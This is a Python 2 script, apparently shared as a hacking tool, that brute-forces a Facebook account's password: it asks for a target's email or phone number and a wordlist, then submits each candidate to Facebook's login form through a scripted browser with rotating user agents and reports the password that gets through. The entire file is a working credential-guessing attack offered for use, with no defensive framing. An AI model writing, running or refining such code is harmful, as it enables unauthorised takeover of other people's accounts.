#!/usr/bin/env python
#! coded by ANtqAmE (ALi Qasseim)
#########################################################################
#colors
wi = "\033[1;37m"
rd = "\033[1;31m"
gr = "\033[1;32m"
yl = "\033[1;33m"
bl = "\033[1;34m"
#########################################################################
import sys
import mechanize
import cookielib
import random

def banner():
    print'''  

 
 
#   .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
#  | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
#  | |      __      | || | ____  _____  | || |  _________   | || |    ___       | || |      __      | || | ____    ____ | || |  _________   | |
#  | |     /  \     | || ||_   \|_   _| | || | |  _   _  |  | || |  .'   '.     | || |     /  \     | || ||_   \  /   _|| || | |_   ___  |  | |
#  | |    / /\ \    | || |  |   \ | |   | || | |_/ | | \_|  | || | /  .-.  \    | || |    / /\ \    | || |  |   \/   |  | || |   | |_  \_|  | |
#  | |   / ____ \   | || |  | |\ \| |   | || |     | |      | || | | |   | |    | || |   / ____ \   | || |  | |\  /| |  | || |   |  _|  _   | |
#  | | _/ /    \ \_ | || | _| |_\   |_  | || |    _| |_     | || | \  `-'  \_   | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |  _| |___/ |  | |
#  | ||____|  |____|| || ||_____|\____| | || |   |_____|    | || |  `.___.\__|  | || ||____|  |____|| || ||_____||_____|| || | |_________|  | |
#  | |              | || |              | || |              | || |              | || |              | || |              | || |              | |
#  | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
#   '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'                                                        
    '''
def the_show():
    print(yl)+'''

                                    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                                    !                                   |                                       !
                                    !-------------------Author : ANtqAmE (ALi Qasseim)--------------------------!
                                    !                                                                           !
                                    !-------------Name_script:Exploitation all the systems, V 2.0---------------!
                                    !                                                                           !
                                    !------------website : http://www.antqame.blogspot.com----------------------!
                                    !                                                                           !
                                    !------------facebook :https://www.facebook.com/ANtqAmE---------------------!
                                    !                                                                           !
                                    !--------youtube:https://www.youtube.com/channel/UC1QRVK_K4jWPDXm798orw-g---!
                                    !                                                                           !        
                                    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

    '''

banner()
the_show()


email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))


passwordlist = str(raw_input("Enter the wordlist name and path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			raw_input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordlist,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """
        +=========================================+
        |..........   Facebook Crack   ...........|
        +-----------------------------------------+
        |            #Author: ANtqAmE         	  | 
        |	           Version 1.0                |
        +=========================================+
        |..........  Facebook Cracker  ...........|
        +-----------------------------------------+\n\n
"""
	total = open(passwordlist,"r")
	total = total.readlines()
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(total), "passwords"
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()